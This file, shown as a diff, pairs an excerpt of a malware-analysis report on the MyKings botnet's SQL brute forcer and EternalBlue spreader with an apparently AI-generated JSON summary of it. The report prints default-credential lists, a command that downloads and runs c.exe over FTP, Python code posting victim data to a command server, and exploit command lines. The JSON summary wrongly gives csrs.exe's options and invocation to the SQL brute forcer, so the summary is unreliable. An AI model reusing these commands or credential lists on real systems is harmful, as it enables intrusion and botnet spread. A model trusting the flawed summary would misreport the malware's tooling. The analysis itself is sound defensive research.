@@ -1,0 +1,483 @@
+
+
+
+Sentence : Initial infection vector
+Normally this would be the first item in the description of the infection chain. However, our
+investigation started in the middle, with the bootkit installer, and the initial infection vector could be
+identified only after the components were analyzed in detail and revealed some connections.
+SQL server brute forcing
+Our telemetry indicated that in some cases the bootkit installer was created by sqlservr.exe, the genuine
+clean application by Microsoft.
+Multiple articles that cover the MyKings botnet suggest that SQL brute forcing is one of the spreading
+method used by the threat actors. This was a good enough starting point to search for tools that could
+inject commands into SQL servers.
+21
+SQL command collection
+A file found on pastebin came to our aid to fill in the gaps. This file contains SQL command scripts that
+match many of the file names, event names and IP addresses used in MyKings attacks. This is very
+strong indication that this command collection is related to MyKings.
+We suspect that it was not uploaded by the threat actors, rather they were collected from infected
+systems by a threat response team.
+A couple of the scripts were particularly conclusive to establish the connection.
+dbdotas1.sql
+This is the main SQL script, that does component download and execution.
+The activities performed by this script match those of the updater mechanism of the MyKings botnet.
+dbdotas2.sql
+This is a smaller SQL script, that creates a WMI script that also does component download and
+execution.
+22
+The WMI script is injected with name fuckyoumm2_consumer, which is the event consumer name that
+some variants of the c3.bat script remove. This event name was also found in some of the MyKings
+related WMI commands.
+SQL brute forcer
+A writeup by DrWeb researchers describes a SQL brute forcer tool related to the Mirai botnet.
+There are many key points that show connections to the MyKings bootkit case, for example the use of
+dbdotas* script names, also elements in the 123.bat file appear in c3.bat,
+running c:\windows\debug\item.dat with export ServiceMain and parameter aaaa .
+We have found over a dozen different variants of the program, some of them appeared in our telemetry
+report along with the bootkit, a DNSChanger and a ForShare variant. This connects the brute forcer
+application to the MyKings operations.
+The tool has the following command line parameters:
+-s
+```
+  -run
+-delete
+-create
+-stop
+-start
+-cli
+-srv
+-see
+-log
+-syn
+```
+During the first execution on an infected system, it is executed with the command lines switches -create
+-run .
+If -log is specified, then the tool creates a detailed log file during execution:
+23
+The wpdmd5.txt file referred in the log would contain the md5 value of the wpdtest.dat file, which is an
+encrypted data file.
+Normally closes the command prompt where it was started from, but with the -see option it leaves open
+and status messages are revealed.
+Checks the mutex {3E025CB2-2CD1-4441-98FD-4E6346064404} to make sure it runs as a single instance.
+Downloads the following files:
+```
+  45.58.135[.]106/xpxmr.dat
+  45.58.135[.]106/ok/wpd.html
+  66.117.6[.]174/ver.txt
+  66.117.6[.]174/shellver.txt
+  66.117.6[.]174/csrs.exe
+```
+The tool supports several different infection methods, each targeting different applications or services.
+It may vary between the versions, but the older versions usually contained the following spreading
+modules:
+```
+  [Cracker:IPC]
+[Cracker:MSSQL]
+  [Cracker:MySQL]
+  [Cracker:RDP]
+[Cracker:SSH]
+[Cracker:Telnet]
+[Cracker:WMI]
+```
+Some of the variant contain source file information. From this we can conclude that the following source
+files are typically in the project:
+```
+  CheckUpdate.cpp
+  Cracker_Inline.cpp
+  Cracker_Standalone.cpp
+  cService.cpp
+  CThreadPool.cpp
+  Db_Mysql.cpp
+  Dispatcher.cpp
+  IpFetcher.cpp
+  libtelnet.cpp
+  Logger_Stdout.cpp
+  Scanner_Tcp_Connect.cpp
+```
+24
+```
+  Scanner_Tcp_Raw.cpp
+  ServerAgent.cpp
+  Task_Crack_Ipc.cpp
+  Task_Crack_Mssql.cpp
+  Task_Crack_Mysql.cpp
+  Task_Crack_Rdp.cpp
+  Task_Crack_Ssh.cpp
+  Task_Crack_Telnet.cpp
+  Task_Crack_Wmi.cpp
+  Task_Scan.cpp
+```
+The Task_Crack*.cpp files correspond to the different attack modules.
+It also downloads the file wpdtest.dat, which is the encrypted configuration. It is an XML file that
+contains the configuration data for the attack modules.
+```
+  
+
+3
+100.43.155.171
+
+0
+0
+0
+0
+0
+0
+0
+0
+
+```
+Each module has its own section, that specifies the password list that should be probed. For example,
+the credential list for the SQL module is the following:
+```
+  
+sa 
+sa sa
+sa 123
+sa 123456
+sa password
+sa 525464
+sa shabixuege!@# 
+vice vice
+```
+Or in the case of Telnet:
+```
+  
+!!Huawei @HuaweiHgw
+system ping ;sh
+root 1001chin
+root xc3511
+root vizxv
+admin admin
+```
+Additionally, for each module the list of commands is specified that will be executed on successful
+compromise. For example, on a successful RDP attack the following infection via ftp download is
+executed:
+```
+  
+cmd.exe /c sc delete sharedaccess&echo open 39.109.18.11>s&echo
+  test>>s&echo 3389>>s&echo binary >>s&echo get c.exe>>s&echo bye>>s&ftp   s:s&start c.exe
+```
+25
+```
+  
+```
+It creates SQL jobs that match the command scripts from the github sql command collection.
+Some of the variants contain embedded Linux ELF binaries, that contains strings like GET
+/mirai/mirai.arm. These binaries are Mirai related downloader components for different processor
+architectures.
+This could be a leftover form an early template used for the spreader. The embedded ELF binaries use
+the hardcoded IP address to download the modules from. This address is also used in the Telnet
+spreader module:
+26
+We found these IP addresses used in the Mirai related spreading code:
+```
+  67.229.225.20
+118.193.85.90
+180.150.226.155
+192.154.110.156
+```
+It is not clear whether this address is actively used in MyKings, or just a leftover from development
+stage. We found no other connection in the Windows components. On the other hand, it makes no
+sense to keep changing an unused IP address in the code. It is a possibility that apart from the mining
+related MyKings operation on Windows, the threat actors are also engaged in Mirai botnet, using the
+same spreader for both.
+Some older variants download an update from the URL
+hxxp://ww3.sinaimg.cn/mw690/717a8b4dgw1f99ly7blarj20c40e4b2a.jpg. At first it looks like an
+ordinary picture of Taylor Swift, but a closer look reveals more.
+27
+A closer look at the picture file reveals that beyond the image content it contains an appended executable
+
+a VMProtect packed version of the SQL brute forcer
+
+This way the update of the brute forcer tool could be disguised as the download of an innocent image file.
+Newer versions of the tool added support for the EternalBlue exploit (MS17010). This functionality is not
+integrated into the spreader program, rather it uses an external program for that, usually created with the
+name csrs.exe . This extra component is an executable converted from Python scripts; it will be described
+in the next section in more detail.
+On normal execution it starts spreading in threads:
+```
+  [INFO]08:56:16 [main] WPD V2.0 BULID Dec 28 2018 03:38:41
+  [INFO]08:56:16 [main] System is NOT server
+  [INFO]08:56:16 [main] Work Mode: Local
+  [MSG]08:56:16 [ServerAgent] HTTP Get [https://ip.seeip.org/geoip]
+  [DEBUG]08:56:16 [ServerAgent] Upload thread started
+  [MSG]08:56:18 [ServerAgent] HTTP RETURN: xxx.xxx.xxx.xxx
+  [DEBUG]08:56:19 [ServerAgent] download wpdtest.dat success
+  [DEBUG]08:56:19 [ServerAgent] remote md5: 143b134b938e1d89957dcced9a1d3228,local
+md5:
+[DEBUG]08:56:19 [ServerAgent] genericRandom entry
+  [INFO]08:56:19 [update] check update ...
+  [INFO]08:56:20 [update] ver is same, keep running.
+  [INFO]08:56:20 [update] check http://66.117.6.174/shellver ...
+  [INFO]08:56:20 [main] Scanner Running in TCP_CONNECT mode.
+  [MSG]08:56:20 [TP:CrackerWMI] Preparing threads[100], please wait ...
+  [DEBUG]08:56:20 [Cracker] HandleMs17010 begin
+  [MSG]08:56:21 [TP:CrackerWMI] 100 threads created
+  [MSG]08:56:21 [TP:Scanner] Preparing threads[300], please wait ...
+```
+One of the lines ([INFO]08:56:20 [main] Scanner Running in TCP_CONNECT mode.) signals that the
+program performs a portscan in the local area network, as visible in the RCA logs as well, connecting to a
+series of neighboring IPs:
+EternalBlue spreader
+The groups was one of the earliest known adopters of the EternalBlue exploit, originally leaked by the
+Shadow Brokers.
+28
+In fact, we found two very different EternalBlue implementations used in MyKings campaigns.
+The earlier version, found in August 2018, was completely based on the NSA leak files.
+It is a self-extracting ZIP file with a couple of custom components inserted. The comment is turned out
+to be in Chinese, and it is the same as in the c3.bat dropper: “The following comments contain selfextracting script commands”
+The archive contained files from the Shadow Brokers distribution, along with the MyKings additions, the
+most important of which were:
+
+ns.exe : custom built version of the open source port scanner, masscan, modified to execute
+
+downShell.exe and perform the update process
+
+
+downShell.exe : EternalBlue spreader tool
+
+
+ok32.dll : 32-bit version of the WMIInjector Trojan (see the section about c.bat
+
+
+ok64.dll : 64-bit version of the WMIInjector Trojan
+
+
+1.ini : custom initialization file
+
+
+On opening the archive, nothing is set to be executed: This archive only copies the content into
+c:\windows, and expects other modules to execute it. We found a DNSChanger version that referred to
+the components in c:\windows\nsa directory, these must have been used together with this SFX file.
+The archive contains the EternalBlue and EternalRomance components form the Shadow Brokers leak,
+and a configuration file that would execute the appropriate files.
+On execution downShell.exe writes out the log:
+未能 读 取 ips.txt，退出
+(translation: Failed to read ips.txt, exit)
+Apparently the package is incorrectly compiled, ip.txt should be called ips.txt.
+Configured correctly, the messages would be documenting the execution of the exploit modules and the
+targeted IP address ranges:
+```
+  start process 2.78.0.0-2.79.0.0
+```
+执 行 1 dll\a.exe --InConfig dll\a.xml --NetworkTimeout 5 --TargetIp 2.78.0.0-
+```
+  2.79.0.0 --TargetPort 445 --LogFile ips/2.78.0.0-2.79.0.0.txt
+  start process 52.210.0.0-52.211.0.0
+```
+29
+执 行 1 dll\a.exe --InConfig dll\a.xml --NetworkTimeout 5 --TargetIp 52.210.0.0-
+```
+  52.211.0.0 --TargetPort 445 --LogFile ips/52.210.0.0-52.211.0.0.txt
+  start process 46.52.0.0-46.53.0.0
+```
+( 执 行 means execute in Chinese.)
+The program reads the content of the 1.ini file, that would specify the payload to be delivered by the
+exploits. Although in theory it could support all major exploits from the Shadow Brokers leak
+(EternalBlue, EternalRomance, EternalSynergy and EternalChampion), only the first two are
+implemented, both execute the 32- or 64-bit version of the WMIInjector Trojan.
+Only a month later, in September 2018, the MyKings group switched to a different approach to using
+the EternalBlue exploit. It is based on a public project on Github. Our telemetry confirmed that the
+EternalBlue exploiter (going with the filename csrs.exe ) was created by the SQL brute forcer tool
+(msinfo.exe), and the origin of the entire infection chain was the PowerShell command executed by the
+injected WMI command.
+The main component of the project, MyExploiter, was modified to cover the needs of MyKings.
+The reported version of the tool is:
+```
+  csrs.exe 1.0
+Usage: "usage:csrs.exe [options] target"
+```
+It supports the following options:
+```
+  --version       show program's version number and exit
+  -h, --help      show this help message and exit
+  -m MODE, --mode=MODE attack mode 0:ms17010 attack one; 1: ms17010 attack by
+  file; 2:blue attack one;3:blue attack Mul;4:check
+one;5:check Mul)
+-p PORT, --port=PORT SMB SERVICE PORT
+-u USER, --user=USER SMB USER
+-U USERS, --users=USERS
+```
+30
+```
+  user file,SMB USERS
+  --pwd=password    SMB USER PASSWORD
+  --pwds=passwords, --pwds=passwords
+  pwd file,EACH SMB USER PASSWORDS
+  -t THREADS, --threads=THREADS
+thread num
+-c COMMOND, --cmd=COMMOND
+  execute commond on target
+  -b BATCH, --batch=BATCH
+  batch file,execute batch file on target
+  -l LISTEN PORT, --listen=LISTEN PORT
+LISTEN PORT
+```
+This help message is unmodified from the original source, however, there are a few additional
+undocumented features.
+The exploiter is executed by the SQL brute forcer with the following command flags:
+```
+  -m 6 -t 200 -l 9999
+```
+-m specifies that the attack mode is 6, which is a MyKings addition, the original source doesn't have this
+as it only supported modes 0 through 5, MyKings added an extra mixedAttack mode.
+```
+modeDic = {'0': attackOne,'1': attackMul,'2': blueAttackOne,'3': blueAttackMul,'4':
+checkOne,'5': checkMul,'6': mixedAttack,'support': 'NO'}
+```
+The -t option specifies the use of 200 threads for spreading.
+The -l options is another MyKings addition, it specifies to open a socket on port 9999 for listening.
+This mixed mode calls the MS17-010 exploit library to send this custom command to the target
+computers:
+31
+This creates a new user account admin$ as part of the local admin group, then deletes old WMI event
+consumers and adds the new event consumer with the PowerShell command line, then downloads and
+executes a couple of other components.
+The spreader expects to receive target IP list to be used for spreading on this communication socket. If
+the -l option is not specified, the tool expects an IP address list file passed as a command line parameter.
+The info about the targeted computers is uploaded to a server:
+```
+  def uploadResult(self, typeStr, content):
+  return requests.post('hxxp://173.208.172[.]202:9999', data=typeStr + ';'
+  + content + '\n')
+```
+The latest version of the spreader largely simplified the command invoked by the exploit to the
+following:
+blue.txt is a simple downloader script that downloads the bootkit dropper, a DNSChanger variant and a
+WinRAR SFX dropper for c3.bat.
+Output : 
+To create a structured JSON representation of the information provided in the text, we can break down the content into key components such as tools, commands, and processes involved in the MyKings campaign. Here is a detailed JSON structure:
+
+```json
+{
+  "campaign": "MyKings",
+  "tools": [
+    {
+      "name": "SQL Brute Forcer Tool (msinfo.exe)",
+      "description": "A tool used to perform SQL brute force attacks and initiate the infection chain.",
+      "options": [
+        "-m MODE, --mode=MODE",
+        "-p PORT, --port=PORT",
+        "-u USER, --user=USER",
+        "-U USERS, --users=USERS",
+        "--pwd=password",
+        "--pwds=passwords",
+        "-t THREADS, --threads=THREADS",
+        "-c COMMOND, --cmd=COMMOND",
+        "-b BATCH, --batch=BATCH",
+        "-l LISTEN PORT, --listen=LISTEN PORT"
+      ],
+      "commands": [
+        {
+          "command": "-m 6 -t 200 -l 9999",
+          "description": "Executes the mixedAttack mode with 200 threads and opens a listening socket on port 9999."
+        }
+      ]
+    },
+    {
+      "name": "EternalBlue Spreader (csrs.exe)",
+      "description": "A tool used to exploit the EternalBlue vulnerability.",
+      "options": [
+        "--version",
+        "-h, --help",
+        "-m MODE, --mode=MODE",
+        "-p PORT, --port=PORT",
+        "-u USER, --user=USER",
+        "-U USERS, --users=USERS",
+        "--pwd=password",
+        "--pwds=passwords",
+        "-t THREADS, --threads=THREADS",
+        "-c COMMOND, --cmd=COMMOND",
+        "-b BATCH, --batch=BATCH",
+        "-l LISTEN PORT, --listen=LISTEN PORT"
+      ],
+      "commands": [
+        {
+          "command": "-m 6 -t 200 -l 9999",
+          "description": "Executes the mixedAttack mode with 200 threads and opens a listening socket on port 9999."
+        }
+      ]
+    },
+    {
+      "name": "WMIInjector Trojan (ok32.dll, ok64.dll)",
+      "description": "A trojan that is delivered by the EternalBlue exploit.",
+      "versions": [
+        {
+          "architecture": "32-bit",
+          "file": "ok32.dll"
+        },
+        {
+          "architecture": "64-bit",
+          "file": "ok64.dll"
+        }
+      ]
+    },
+    {
+      "name": "ns.exe",
+      "description": "A custom built version of the open source port scanner, masscan, modified to execute downShell.exe and perform the update process."
+    },
+    {
+      "name": "downShell.exe",
+      "description": "EternalBlue spreader tool.",
+      "logs": [
+        "Failed to read ips.txt, exit"
+      ]
+    }
+  ],
+  "infection_chain": [
+    {
+      "step": 1,
+      "action": "PowerShell command executed by the injected WMI command",
+      "tool": "WMI command"
+    },
+    {
+      "step": 2,
+      "action": "SQL brute forcer tool (msinfo.exe) is executed",
+      "tool": "msinfo.exe"
+    },
+    {
+      "step": 3,
+      "action": "EternalBlue spreader (csrs.exe) is created by the SQL brute forcer tool",
+      "tool": "csrs.exe"
+    },
+    {
+      "step": 4,
+      "action": "Target IP list received on the listening socket (port 9999)",
+      "tool": "csrs.exe"
+    },
+    {
+      "step": 5,
+      "action": "Exploit modules are executed to target specified IP ranges",
+      "tool": "csrs.exe"
+    },
+    {
+      "step": 6,
+      "action": "New user account admin$ is created as part of the local admin group",
+      "tool": "csrs.exe"
+    },
+    {
+      "step": 7,
+      "action": "Old WMI event consumers are deleted and new ones are added with PowerShell command line",
+      "tool": "csrs.exe"
+    },
+    {
+      "step": 8,
+      "action": "Components are downloaded and executed",
+      "components": [
+        "bootkit dropper",
+        "DNSChanger variant",
+        "WinRAR SFX dropper for c3.bat"
+      ]
+    }
+  ],
+  "servers": [
+    {
+      "url": "hxxp://173.208.172[.]202:9999",
+      "description": "Server to which information about targeted computers is uploaded."
+    }
+  ]
+}
+```
+
+This JSON structure provides a clear and organized representation of the tools, commands, infection chain, and servers involved in the MyKings campaign. Each tool and step in the infection chain is detailed with relevant descriptions and options.
